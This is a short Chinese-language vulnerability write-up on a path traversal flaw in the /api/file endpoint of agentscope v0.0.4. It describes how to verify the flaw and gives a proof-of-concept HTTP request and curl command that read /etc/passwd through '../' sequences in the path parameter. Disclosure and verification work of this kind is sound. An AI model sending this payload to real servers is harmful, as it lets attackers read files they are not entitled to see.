验证漏洞存在方法
    - 访问目标服务器的`/api/file`端点
    - 尝试通过`path`参数读取系统文件，如`/etc/passwd`
    - 如果成功读取到系统文件内容，则漏洞存在

漏洞利用方法
    - 该漏洞存在于modelscope/agentscope v.0.0.4版本的API端点`/api/file`中
    - 由于未正确清理`path`参数，攻击者可以通过路径遍历技术读取服务器上的任意文件
    - 攻击者可以构造恶意请求，通过`../`等路径遍历序列访问受限目录外的文件
    
    - **PoC示例**：
      ```
      GET /api/file?path=../../../../etc/passwd HTTP/1.1
      Host: target-server.com
      
      或使用curl命令：
      curl "http://target-server.com/api/file?path=../../../../etc/passwd"
      ```
      
      成功响应将返回`/etc/passwd`文件的内容，证明漏洞存在并可被利用
